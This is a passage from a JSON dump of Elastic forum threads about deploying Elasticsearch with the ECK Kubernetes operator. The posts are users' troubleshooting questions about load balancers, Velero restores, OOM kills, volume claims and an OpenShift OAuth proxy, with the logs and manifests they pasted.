    "body": "Hello, I'm trying to deploy quickstart to our Kubernetes Cluster and get stuck with LoadBalancer. Name: quickstart-es-http Namespace: default Labels: common.k8s.elastic.co/type=elasticsearch elasticsearch.k8s.elastic.co/cluster-name=quickstart Annotations: kubectl.kubernetes.io/last-applied-configuration: {\"apiVersion\":\"v1\",\"kind\":\"Service\",\"metadata\":{\"annotations\":{},\"creationTimestamp\":\"2020-03-24T10:36:31Z\",\"labels\":{\"common.k8s.elastic.... Selector: common.k8s.elastic.co/type=elasticsearch,elasticsearch.k8s.elastic.co/cluster-name=quickstart Type: LoadBalancer IP: 10.247.213.185 Port: https 9200/TCP TargetPort: 9200/TCP NodePort: https 30448/TCP Endpoints: 172.16.0.51:9200 Session Affinity: None External Traffic Policy: Cluster Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal EnsuringLoadBalancer 7d17h (x139 over 8d) service-controller Ensuring load balancer Normal UpdatedLoadBalancer 22m service-controller Updated load balancer with new pods Normal EnsuringLoadBalancer 2m49s (x10 over 23m) service-controller Ensuring load balancer Warning CreatingLoadBalancerFailed 2m49s (x10 over 23m) service-controller Error creating load balancer (will retry): failed to ensure load balancer for service default/quickstart-es-http: service loadbalancer IP is invalid Can you please advise where to start digging in? Thanks a lot in advance",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "60765b2e-9055-491d-bfe6-dd66a6e5f4a6",
    "url": "https://discuss.elastic.co/t/cross-cluster-replication-on-eck-cross-region-replication/205311",
    "title": "Cross Cluster Replication on ECK - cross region replication",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "October 25, 2019, 6:39pm April 2, 2020, 9:52am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f715d76c-eee9-4dbf-8089-4aeabb6f9b46",
    "url": "https://discuss.elastic.co/t/can-i-disable-the-webhook/226113",
    "title": "Can I disable the webhook?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "data_smith",
    "date": "April 1, 2020, 6:36pm April 1, 2020, 7:04pm April 2, 2020, 9:47am",
    "body": "I'd like to disable the webhook. How do i do that?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "af80d449-6871-40ed-9531-cab5bafb3f68",
    "url": "https://discuss.elastic.co/t/master-election-error-after-velero-restore/225906",
    "title": "Master election error after Velero restore",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "TomaszKlosinski",
    "date": "March 31, 2020, 3:48pm April 3, 2020, 1:47pm",
    "body": "Hello, I've tested backup and restore of ELK stack deployed with Elastic operator and I have problem with restoring Elasticsearch. I've opened an issue on GitHub as it seems to me it's an ECK bug: github.com/elastic/cloud-on-k8s Master election error after Velero restore opened 12:47PM - 31 Mar 20 UTC TomaszKlosinski Bug Report What did you do? I've created a schedule with a daily Kubernetes backup in Velero (without Volumes' data). Then I've removed... triage In any case, I could also misconfigure something. Below are the details of the problem: What did you do? I've created a schedule with a daily Kubernetes backup in Velero (without Volumes' data). Then I've removed elastic operator, ELK and filebeat for test: $ kubectl delete ns elastic-system elk-stack filebeat And then I restored it from the backup: $ velero restore create --from-backup kubernetes-daily-20200330000002 --include-namespaces elastic-system,elk-stack,filebeat The restore is successful, but elasticsearch afterwards is not working. Here're the logs: https://pastebin.com/R8DpUrpH It seems to me that this is core of the problem: {\"type\": \"server\", \"timestamp\": \"2020-03-31T12:52:40,008Z\", \"level\": \"WARN\", \"component\": \"o.e.c.c.ClusterFormationFailureHelper\", \"cluster.name\": \"elk-stack\", \"node.name\": \"elk-stack-es-master-green-0\", \"message\": \"master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster, and [cluster.initial_master_nodes] is empty on this node: have discovered [{elk-stack-es-master-green-0}{TWEH9Px6TBm92a9dL-mRgg}{pNPr8dRITru5PkbIpXpnew}{10.45.2.132}{10.45.2.132:9300}{lm}{ml.machine_memory=5368709120, xpack.installed=true, zone=GREEN, ml.max_open_jobs=20}, {elk-stack-es-master-eshelter-0}{kAof-xZaQhajOSlukeNXIQ}{Ag0JSqPVShuWBm9NGZG32w}{10.45.3.175}{10.45.3.175:9300}{lm}{ml.machine_memory=5368709120, ml.max_open_jobs=20, xpack.installed=true, zone=ESHELTER}, {elk-stack-es-master-green-1}{qWmtII20SG6UJAl1QANEPQ}{OD1rwvA7TCmQZNvX_gXwcg}{10.45.2.135}{10.45.2.135:9300}{lm}{ml.machine_memory=5368709120, ml.max_open_jobs=20, xpack.installed=true, zone=GREEN}, {elk-stack-es-master-eshelter-1}{wGX7DppyQc2G30WlpuKQAw}{bu3C-bKlTI6c4LgPfXROCw}{10.45.4.207}{10.45.4.207:9300}{lm}{ml.machine_memory=5368709120, ml.max_open_jobs=20, xpack.installed=true, zone=ESHELTER}]; discovery will continue using [127.0.0.1:9300, 127.0.0.1:9301, 127.0.0.1:9302, 127.0.0.1:9303, 127.0.0.1:9304, 127.0.0.1:9305, 10.45.2.135:9300, 10.45.3.175:9300, 10.45.4.207:9300] from hosts providers and [{elk-stack-es-master-green-0}{TWEH9Px6TBm92a9dL-mRgg}{pNPr8dRITru5PkbIpXpnew}{10.45.2.132}{10.45.2.132:9300}{lm}{ml.machine_memory=5368709120, xpack.installed=true, zone=GREEN, ml.max_open_jobs=20}] from last-known cluster state; node term 0, last-accepted version 0 in term 0\" } What did you expect to see? Elasticsearch working. What did you see instead? Under which circumstances? Elasticsearch not working. Errors in logs suggest it can't elect master. Environment ECK version: docker.elastic.co/eck/eck-operator:1.0.0 Kubernetes information: On premise: Yes, manually installed with kubeadm. Version 1.16. $ kubectl version Client Version: version.Info{Major:\"1\", Minor:\"17\", GitVersion:\"v1.17.3\", GitCommit:\"06ad960bfd03b39c8310aaf92d1e7c12ce618213\", GitTreeState:\"clean\", BuildDate:\"2020-02-13T18:08:14Z\", GoVersion:\"go1.13.8\", Compiler:\"gc\", Platform:\"darwin/amd64\"} Server Version: version.Info{Major:\"1\", Minor:\"16+\", GitVersion:\"v1.16.6-beta.0\", GitCommit:\"e7f962ba86f4ce7033828210ca3556393c377bcc\", GitTreeState:\"clean\", BuildDate:\"2020-01-15T08:18:29Z\", GoVersion:\"go1.13.5\", Compiler:\"gc\", Platform:\"linux/amd64\"}",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a503f07f-765a-466a-bb57-ee31a7311035",
    "url": "https://discuss.elastic.co/t/error-from-server-timeout-error-when-creating-stdin-timeout-request-did-not-complete-within-requested-timeout-30s/196680",
    "title": "Error from server (Timeout): error when creating \"STDIN\": Timeout: request did not complete within requested timeout 30s",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "alexus",
    "date": "August 26, 2019, 3:18pm August 25, 2019, 11:41pm August 26, 2019, 3:30pm August 29, 2019, 2:05pm September 7, 2019, 6:24pm September 12, 2019, 12:48pm September 12, 2019, 1:48pm September 12, 2019, 7:36pm September 12, 2019, 7:38pm September 12, 2019, 8:47pm March 31, 2020, 8:58pm",
    "body": "Hello World! I'm trying to follow Quickstart | Elastic Cloud on Kubernetes [0.9] | Elastic: Deploy ECK in your Kubernetes cluster $ kubectl apply -f https://download.elastic.co/downloads/eck/0.9.0/all-in-one.yaml customresourcedefinition.apiextensions.k8s.io/apmservers.apm.k8s.elastic.co created customresourcedefinition.apiextensions.k8s.io/elasticsearches.elasticsearch.k8s.elastic.co created customresourcedefinition.apiextensions.k8s.io/trustrelationships.elasticsearch.k8s.elastic.co created customresourcedefinition.apiextensions.k8s.io/kibanas.kibana.k8s.elastic.co created clusterrole.rbac.authorization.k8s.io/elastic-operator created clusterrolebinding.rbac.authorization.k8s.io/elastic-operator created namespace/elastic-system created statefulset.apps/elastic-operator created secret/webhook-server-secret created serviceaccount/elastic-operator created $ $ kubectl -n elastic-system logs statefulset.apps/elastic-operator | tail {\"level\":\"info\",\"ts\":1566775664.8577778,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting Controller\",\"controller\":\"license-controller\"} {\"level\":\"info\",\"ts\":1566775664.8577247,\"logger\":\"kubebuilder.webhook\",\"msg\":\"installing webhook configuration in cluster\"} {\"level\":\"info\",\"ts\":1566775664.957982,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting workers\",\"controller\":\"apmserver-controller\",\"worker count\":1} {\"level\":\"info\",\"ts\":1566775664.958148,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting workers\",\"controller\":\"kibana-association-controller\",\"worker count\":1} {\"level\":\"info\",\"ts\":1566775664.958176,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting workers\",\"controller\":\"kibana-controller\",\"worker count\":1} {\"level\":\"info\",\"ts\":1566775664.9581378,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting workers\",\"controller\":\"license-controller\",\"worker count\":1} {\"level\":\"info\",\"ts\":1566775664.9582195,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting workers\",\"controller\":\"apm-es-association-controller\",\"worker count\":1} {\"level\":\"info\",\"ts\":1566775664.958255,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting workers\",\"controller\":\"trial-controller\",\"worker count\":1} {\"level\":\"info\",\"ts\":1566775664.9582841,\"logger\":\"kubebuilder.controller\",\"msg\":\"Starting workers\",\"controller\":\"elasticsearch-controller\",\"worker count\":1} {\"level\":\"info\",\"ts\":1566775664.9925923,\"logger\":\"kubebuilder.webhook\",\"msg\":\"starting the webhook server.\"} $ Deploy the Elasticsearch cluster $ cat <<EOF | kubectl apply -f - > apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 > kind: Elasticsearch > metadata: > name: quickstart > spec: > version: 7.2.0 > nodes: > - nodeCount: 1 > config: > node.master: true > node.data: true > node.ingest: true > EOF Error from server (Timeout): error when creating \"STDIN\": Timeout: request did not complete within requested timeout 30s $ How does one troubleshoot ECK? Please advise.",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "88f46a40-b15a-45f8-9645-239bcc11ed67",
    "url": "https://discuss.elastic.co/t/oomkilled-crashloopbackoff-error-for-elasticsearch/224782",
    "title": "OOMKilled & Crashloopbackoff error for elasticsearch",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "kasim123",
    "date": "March 26, 2020, 3:24pm March 26, 2020, 11:06am March 26, 2020, 4:09pm March 26, 2020, 4:21pm March 27, 2020, 11:10am March 27, 2020, 11:53am March 31, 2020, 12:36pm",
    "body": "Hi Team, I am trying to use official helm chart to build elasticsearch cluster in k8s cluster. I used same helm chart with CentOS atomic OS and successfully built elasticsearch cluster. However, when I am trying to use same helm chart with RHEL 7.5 Version, I noticed, elasticsearch pods go into Running-->OOMKIlled-->crashloopbackoff state. Not sure, what is wrong with the values.yaml file configuration. Same helm chart works fine with Centos atomic OS. Pls guide do i have to change any setting on RHEL 7.5 OS. We have around 250GB of RAM on each worker node. I am using elasticsearch 7.5.2 version and default JAVAOPTS. image: \"docker.elastic.co/elasticsearch/elasticsearch\" imageTag: \"7.5.2\" imagePullPolicy: \"IfNotPresent\" podAnnotations: {} # iam.amazonaws.com/role: es-cluster # additionals labels labels: {} esJavaOpts: \"-Xmx1g -Xms1g\" I am not seeing any error when I execute dmesg command on master nodes. I can see below message on worker nodes. Kernel version [root@cesiumk8s-elk1 ~]# uname -a Linux cesiumk8s-elk1.xxx.com 3.10.0-862.el7.x86_64 #1 SMP Wed Mar 21 18:14:51 EDT 2018 x86_64 x86_64 x86_64 GNU/Linux [root@cesiumk8s-elk1 ~]# uname -r 3.10.0-862.el7.x86_64 [root@cesiumk8s-elk1 ~]# [530710.804005] Memory cgroup out of memory: Kill process 56296 (java) score 1990 or sacrifice child [530710.805416] Killed process 55956 (java) total-vm:2608264kB, anon-rss:2082960kB, file-rss:5824kB, shmem-rss:0kB [530742.811881] java invoked oom-killer: gfp_mask=0xd0, order=0, oom_score_adj=993 [530742.811886] java cpuset=8697e9c6cba52723e94ab606d496a3e068b1d1e16be1c672d54d68110e5ab900 mems_allowed=0-1 [530742.811889] CPU: 29 PID: 479 Comm: java Kdump: loaded Tainted: G ------------ T 3.10.0-862.el7.x86_64 #1 [530742.811891] Hardware name: Cisco Systems Inc UCSC-C240-M4SX/UCSC-C240-M4SX, BIOS C240M4.4.0.1d.0.1005181458 10/05/2018 [530742.811892] Call Trace: [530742.811901] [<ffffffff9010d768>] dump_stack+0x19/0x1b [530742.811903] [<ffffffff901090ea>] dump_header+0x90/0x229 [530742.811910] [<ffffffff8fb97456>] ? find_lock_task_mm+0x56/0xc0 [530742.811914] [<ffffffff8fc0b1f8>] ? try_get_mem_cgroup_from_mm+0x28/0x60 [530742.811916] [<ffffffff8fb97904>] oom_kill_process+0x254/0x3d0 [530742.811919] [<ffffffff8fc0efe6>] mem_cgroup_oom_synchronize+0x546/0x570 [530742.811921] [<ffffffff8fc0e460>] ? mem_cgroup_charge_common+0xc0/0xc0 [530742.811924] [<ffffffff8fb98194>] pagefault_out_of_memory+0x14/0x90 [530742.811926] [<ffffffff9010720c>] mm_fault_error+0x6a/0x157 [530742.811929] [<ffffffff9011a886>] __do_page_fault+0x496/0x4f0 [530742.811931] [<ffffffff9011a915>] do_page_fault+0x35/0x90 [530742.811935] [<ffffffff90116768>] page_fault+0x28/0x30 [530742.811938] Task in /kubepods/burstable/pod24a8a7ea-b704-4542-943e-4bb11a0ff9df/8697e9c6cba52723e94ab606d496a3e068b1d1e16be1c672d54d68110e5ab900 killed as a result of limit of /kubepods/burstable/pod24a8a7ea-b704-4542-943e-4bb11a0ff9df [530742.811941] memory: usage 2097152kB, limit 2097152kB, failcnt 3651 [530742.811942] memory+swap: usage 2097152kB, limit 9007199254740988kB, failcnt 0 [530742.811943] kmem: usage 15412kB, limit 9007199254740988kB, failcnt 0 [530742.811944] Memory cgroup stats for /kubepods/burstable/pod24a8a7ea-b704-4542-943e-4bb11a0ff9df: cache:0KB rss:0KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:0KB inactive_file:0KB active_file:0KB unevictable:0KB [530742.811960] Memory cgroup stats for /kubepods/burstable/pod24a8a7ea-b704-4542-943e-4bb11a0ff9df/e64e6862ec7f1c2a40af2d5abe56719cc323b6a96e8c799779d399a33109617e: cache:0KB rss:40KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:40KB inactive_file:0KB active_file:0KB unevictable:0KB [530742.811979] Memory cgroup stats for /kubepods/burstable/pod24a8a7ea-b704-4542-943e-4bb11a0ff9df/8697e9c6cba52723e94ab606d496a3e068b1d1e16be1c672d54d68110e5ab900: cache:40KB rss:2081660KB rss_huge:2066432KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:2081660KB inactive_file:40KB active_file:0KB unevictable:0KB [530742.811992] [ pid ] uid tgid total_vm rss nr_ptes swapents oom_score_adj name [530742.812260] [54433] 1000 54433 253 1 4 0 -998 pause [530742.812266] [57057] 1000 57057 652066 521866 1052 0 993 java [530742.812268] Memory cgroup out of memory: Kill process 479 (java) score 1989 or sacrifice child [530742.813666] Killed process 57057 (java) total-vm:2608264kB, anon-rss:2081636kB, file-rss:5828kB, shmem-rss:0kB Thanks, Kasim Shaik",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "e6b18679-0b59-4003-9856-0e58f73a20d8",
    "url": "https://discuss.elastic.co/t/pod-has-unbound-immediate-persistentvolumeclaims/223788",
    "title": "Pod has unbound immediate PersistentVolumeClaims",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tillias",
    "date": "March 17, 2020, 1:36pm March 16, 2020, 7:39pm March 17, 2020, 1:35pm March 17, 2020, 8:41am March 17, 2020, 1:35pm March 17, 2020, 12:34pm",
    "body": "Hello, I'm trying to deploy ECK into Open Telekom Cloud. Before I have tested it in GCP Kubernetes Engine and it works like a charm. Unfortunately I have some problem in Open Telekom Cloud related to PersistentVolumeClaims. I'm using https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-quickstart.html and it seems pvc is not created for quick-start-es-default-0 pod: kubectl describe pod quickstart-es-default-0 Name: quickstart-es-default-0 Namespace: default Priority: 0 PriorityClassName: <none> Node: <none> Labels: common.k8s.elastic.co/type=elasticsearch controller-revision-hash=quickstart-es-default-5d7cbf6c5b elasticsearch.k8s.elastic.co/cluster-name=quickstart elasticsearch.k8s.elastic.co/config-hash=2034778696 elasticsearch.k8s.elastic.co/http-scheme=https elasticsearch.k8s.elastic.co/node-data=true elasticsearch.k8s.elastic.co/node-ingest=true elasticsearch.k8s.elastic.co/node-master=true elasticsearch.k8s.elastic.co/node-ml=true elasticsearch.k8s.elastic.co/statefulset-name=quickstart-es-default elasticsearch.k8s.elastic.co/version=7.6.1 statefulset.kubernetes.io/pod-name=quickstart-es-default-0 Annotations: <none> Status: Pending IP: Controlled By: StatefulSet/quickstart-es-default Init Containers: elastic-internal-init-filesystem: Image: docker.elastic.co/elasticsearch/elasticsearch:7.6.1 Port: <none> Host Port: <none> Command: bash -c /mnt/elastic-internal/scripts/prepare-fs.sh Limits: cpu: 100m memory: 50Mi Requests: cpu: 100m memory: 50Mi Environment: POD_IP: (v1:status.podIP) POD_NAME: quickstart-es-default-0 (v1:metadata.name) POD_IP: (v1:status.podIP) POD_NAME: quickstart-es-default-0 (v1:metadata.name) Mounts: /mnt/elastic-internal/downward-api from downward-api (ro) /mnt/elastic-internal/elasticsearch-bin-local from elastic-internal-elasticsearch-bin-local (rw) /mnt/elastic-internal/elasticsearch-config from elastic-internal-elasticsearch-config (ro) /mnt/elastic-internal/elasticsearch-config-local from elastic-internal-elasticsearch-config-local (rw) /mnt/elastic-internal/elasticsearch-plugins-local from elastic-internal-elasticsearch-plugins-local (rw) /mnt/elastic-internal/probe-user from elastic-internal-probe-user (ro) /mnt/elastic-internal/scripts from elastic-internal-scripts (ro) /mnt/elastic-internal/transport-certificates from elastic-internal-transport-certificates (ro) /mnt/elastic-internal/unicast-hosts from elastic-internal-unicast-hosts (ro) /mnt/elastic-internal/xpack-file-realm from elastic-internal-xpack-file-realm (ro) /usr/share/elasticsearch/config/http-certs from elastic-internal-http-certificates (ro) /usr/share/elasticsearch/data from elasticsearch-data (rw) /usr/share/elasticsearch/logs from elasticsearch-logs (rw) Containers: elasticsearch: Image: docker.elastic.co/elasticsearch/elasticsearch:7.6.1 Ports: 9200/TCP, 9300/TCP Host Ports: 0/TCP, 0/TCP Limits: memory: 2Gi Requests: memory: 2Gi Readiness: exec [bash -c /mnt/elastic-internal/scripts/readiness-probe-script.sh] delay=10s timeout=5s period=5s #success=1 #failure=3 Environment: HEADLESS_SERVICE_NAME: quickstart-es-default NSS_SDB_USE_CACHE: no POD_IP: (v1:status.podIP) POD_NAME: quickstart-es-default-0 (v1:metadata.name) PROBE_PASSWORD_PATH: /mnt/elastic-internal/probe-user/elastic-internal-probe PROBE_USERNAME: elastic-internal-probe READINESS_PROBE_PROTOCOL: https Mounts: /mnt/elastic-internal/downward-api from downward-api (ro) /mnt/elastic-internal/elasticsearch-config from elastic-internal-elasticsearch-config (ro) /mnt/elastic-internal/probe-user from elastic-internal-probe-user (ro) /mnt/elastic-internal/scripts from elastic-internal-scripts (ro) /mnt/elastic-internal/unicast-hosts from elastic-internal-unicast-hosts (ro) /mnt/elastic-internal/xpack-file-realm from elastic-internal-xpack-file-realm (ro) /usr/share/elasticsearch/bin from elastic-internal-elasticsearch-bin-local (rw) /usr/share/elasticsearch/config from elastic-internal-elasticsearch-config-local (rw) /usr/share/elasticsearch/config/http-certs from elastic-internal-http-certificates (ro) /usr/share/elasticsearch/config/transport-certs from elastic-internal-transport-certificates (ro) /usr/share/elasticsearch/data from elasticsearch-data (rw) /usr/share/elasticsearch/logs from elasticsearch-logs (rw) /usr/share/elasticsearch/plugins from elastic-internal-elasticsearch-plugins-local (rw) Conditions: Type Status PodScheduled False Volumes: elasticsearch-data: Type: PersistentVolumeClaim (a reference to a PersistentVolumeClaim in the same namespace) ClaimName: elasticsearch-data-quickstart-es-default-0 ReadOnly: false downward-api: Type: DownwardAPI (a volume populated by information about the pod) Items: metadata.labels -> labels elastic-internal-elasticsearch-bin-local: Type: EmptyDir (a temporary directory that shares a pod's lifetime) Medium: elastic-internal-elasticsearch-config: Type: Secret (a volume populated by a Secret) SecretName: quickstart-es-default-es-config Optional: false elastic-internal-elasticsearch-config-local: Type: EmptyDir (a temporary directory that shares a pod's lifetime) Medium: elastic-internal-elasticsearch-plugins-local: Type: EmptyDir (a temporary directory that shares a pod's lifetime) Medium: elastic-internal-http-certificates: Type: Secret (a volume populated by a Secret) SecretName: quickstart-es-http-certs-internal Optional: false elastic-internal-probe-user: Type: Secret (a volume populated by a Secret) SecretName: quickstart-es-internal-users Optional: false elastic-internal-scripts: Type: ConfigMap (a volume populated by a ConfigMap) Name: quickstart-es-scripts Optional: false elastic-internal-transport-certificates: Type: Secret (a volume populated by a Secret) SecretName: quickstart-es-transport-certificates Optional: false elastic-internal-unicast-hosts: Type: ConfigMap (a volume populated by a ConfigMap) Name: quickstart-es-unicast-hosts Optional: false elastic-internal-xpack-file-realm: Type: Secret (a volume populated by a Secret) SecretName: quickstart-es-xpack-file-realm Optional: false elasticsearch-logs: Type: EmptyDir (a temporary directory that shares a pod's lifetime) Medium: QoS Class: Burstable Node-Selectors: <none> Tolerations: node.kubernetes.io/not-ready:NoExecute for 300s node.kubernetes.io/unreachable:NoExecute for 300s Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedScheduling 55s (x15 over 11m) default-scheduler pod has unbound immediate PersistentVolumeClaims (repeated 3 times) Is there any way to create this claim manually?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "42e0b56f-1f67-409f-ad3f-25bda99dadb0",
    "url": "https://discuss.elastic.co/t/cant-downgrade-to-a-correct-version-of-elastic-after-an-attempt-to-upgrade-to-7-6-2/225573",
    "title": "Can't downgrade to a correct version of elastic after an attempt to upgrade to 7.6.2",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Ahmad_Al-Masry",
    "date": "March 29, 2020, 5:54pm March 30, 2020, 7:29am March 30, 2020, 10:04am",
    "body": "Hi By mistake, I have the assumption that 7.6.2 is released on container and so I upgraded thee configurations and applied and ECK accepted the configuration. Unfortunately the pods are failing to start and I can't rollback to 7.6.1. Can anyone give me a workaround?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "22067563-1fe7-4dcd-b20f-5349c373f49b",
    "url": "https://discuss.elastic.co/t/eck-and-ad-authentication-for-kibana/225447",
    "title": "ECK and AD authentication for KIbana",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "March 27, 2020, 5:23pm March 27, 2020, 7:44pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e67a63f8-31b3-458b-a23e-58725c4e95bc",
    "url": "https://discuss.elastic.co/t/installing-templates-on-es-startup/225171",
    "title": "Installing templates on ES startup",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "TimWardFS",
    "date": "March 26, 2020, 11:00am",
    "body": "When using ECK to run up an Elasticsearch cluster, via a Helm chart, what's the best way to install templates into a new cluster (PUT /_template/...)? Possibilities would appear to include: (1) Put some curl commands in the container's lifecycle/postStart. But they might run before ES is up and running, resulting in the template installations failing? (2) Use a Helm post-install hook. But then clients of ES might connect and start using ES before the templates have been installed, resulting in wrong indexing? (3) Something I haven't spotted yet. What do people do that works?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e2325082-1cae-45dd-8456-b7ac0436160f",
    "url": "https://discuss.elastic.co/t/how-to-remove-trial-license-on-not-running-elastic-pod/224967",
    "title": "How to remove trial license on not running elastic pod",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "March 25, 2020, 9:30am March 25, 2020, 9:42am March 25, 2020, 11:08am March 25, 2020, 11:23am March 25, 2020, 11:42am March 25, 2020, 12:07pm March 25, 2020, 12:36pm March 25, 2020, 12:53pm March 25, 2020, 1:13pm March 25, 2020, 1:23pm March 25, 2020, 2:56pm March 25, 2020, 3:05pm March 25, 2020, 3:16pm March 25, 2020, 3:09pm March 25, 2020, 3:15pm",
    "body": "",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "e6225860-7e32-4d63-aedf-3f48d23c1466",
    "url": "https://discuss.elastic.co/t/easiest-way-to-get-a-dashboard/224912",
    "title": "Easiest way to get a dashboard?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tew",
    "date": "March 24, 2020, 7:46pm March 25, 2020, 8:19am",
    "body": "I have the ES operator installed and running an ES cluster. I'd like to get a grafana dashboard running. Is there a walkthrough on enabling the metrics and installing a generic dashboard? Thank you.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ba7c3ed1-28b9-4948-b535-45d10d45ff26",
    "url": "https://discuss.elastic.co/t/volumeclaim-emptydir-overwrite-not-working/224809",
    "title": "VolumeClaim emptyDir overwrite not working",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "TatsuKishi",
    "date": "March 24, 2020, 11:00am March 24, 2020, 1:50pm March 24, 2020, 4:07pm",
    "body": "Hey, I'm trying to disable the PVC for a client/ingest nodeset like stated in documentation, however ECK is still creating the 1gb volume. nodeSet config: nodesets[client].config.podTemplate.volumes: - emptyDir: {} name: elasticsearch-data resulting statefulset snippet: spec.containers.volumes: - name: elasticsearch-data persistentVolumeClaim: claimName: claim-name-placeholder kubectl get pvc: elasticsearch-data-logs-es-client-0 Bound pvc-xyz 1Gi RWO rbd 25h",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e8294855-32d3-4146-9974-468e3b75d329",
    "url": "https://discuss.elastic.co/t/eck-with-openshift-oauth/224459",
    "title": "ECK with Openshift oauth",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Mastana_Guru",
    "date": "March 20, 2020, 5:14pm March 20, 2020, 10:35pm March 21, 2020, 7:20pm",
    "body": "I have successfully installed ECK operator in openshift. Now I am trying to add openshift oauth proxy to kibana, so that users can be authenticated with ldap. Created a SA, but when deploy kibana with oaauth-proxy running into below error. Looking inside the Kibana pod, it doesnot have the /var/run/secrets/kubernetes.io folder. main.go:138: Invalid configuration: cannot read client-secret-file: open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory missing setting: client-id missing setting: client-secret\" deployment yaml apiVersion: kibana.k8s.elastic.co/v1 kind: Kibana metadata: name: kibana namespace: bcnc-logging spec: version: 7.6.1 count: 1 elasticsearchRef: name: \"elasticsearch\" podTemplate: spec: containers: - name: kibana resources: limits: memory: 4Gi cpu: 1 - name: kibana-proxy image: 'registry.redhat.io/openshift3/oauth-proxy:latest' imagePullPolicy: IfNotPresent args: - -provider=openshift - -https-address=:3000 - -http-address= - -email-domain=* - -upstream=http://localhost:5601 - -openshift-service-account=bcnc-logging-sa - -cookie-secret-file=/etc/proxy/secret/session_secret - -tls-cert=/etc/tls/private/tls.crt - -tls-key=/etc/tls/private/tls.key - -client-secret-file=/var/run/secrets/kubernetes.io/serviceaccount/token - -openshift-ca=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt - -skip-provider-button=true env: - name: OAP_DEBUG value: 'False' - name: OCP_AUTH_PROXY_MEMORY_LIMIT valueFrom: resourceFieldRef: containerName: kibana-proxy divisor: '0' resource: limits.memory ports: - containerPort: 3000 name: oaproxy protocol: TCP resources: limits: memory: 256Mi requests: cpu: 100m memory: 256Mi volumeMounts: - mountPath: /etc/tls/private name: secret-bcnc-logging-tls - mountPath: /etc/proxy/secret name: kibana-proxy dnsPolicy: ClusterFirst restartPolicy: Always schedulerName: default-scheduler securityContext: {} # serviceAccount: bcnc-logging-sa serviceAccountName: bcnc-logging-sa terminationGracePeriodSeconds: 30 volumes: - name: secret-bcnc-logging-tls secret: defaultMode: 420 secretName: bcnc-logging-tls - name: kibana-proxy secret: defaultMode: 420 secretName: bcnc-logging-proxy --- apiVersion: v1 kind: Route metadata: name: kibana namespace: bcnc-logging spec: host: kibana-bcnc-logging.ip.dev.aws.com tls: termination: passthrough # Kibana is the TLS endpoint insecureEdgeTerminationPolicy: Redirect to: kind: Service name: kibana-kb-http --- apiVersion: v1 kind: Service metadata: annotations: service.alpha.openshift.io/serving-cert-secret-name: bcnc-logging-tls labels: common.k8s.elastic.co/type: kibana kibana.k8s.elastic.co/name: kibana name: kibana-kb-http namespace: bcnc-logging spec: ports: - name: https port: 5601 protocol: TCP targetPort: 5601 # - name: proxy # port: 3000 # protocol: TCP # targetPort: oaproxy selector: common.k8s.elastic.co/type: kibana kibana.k8s.elastic.co/name: kibana sessionAffinity: None type: ClusterIP --- apiVersion: v1 data: session_secret: XXXXXXXXXXXXXXXX kind: Secret metadata: name: bcnc-logging-proxy namespace: bcnc-logging type: Opaque --- apiVersion: v1 kind: ServiceAccount metadata: annotations: serviceaccounts.openshift.io/oauth-redirectreference.kibana: '{\"kind\":\"OAuthRedirectReference\",\"apiVersion\":\"v1\",\"reference\":{\"kind\":\"Route\",\"name\":\"kibana\"}}' name: bcnc-logging-sa namespace: bcnc-logging",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b9ddf6ed-db84-49fa-be8b-a9558ced4fa9",
    "url": "https://discuss.elastic.co/t/how-to-setup-external-remote-cluster/222016",
    "title": "How to setup external remote cluster?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Matthieu_Paret",
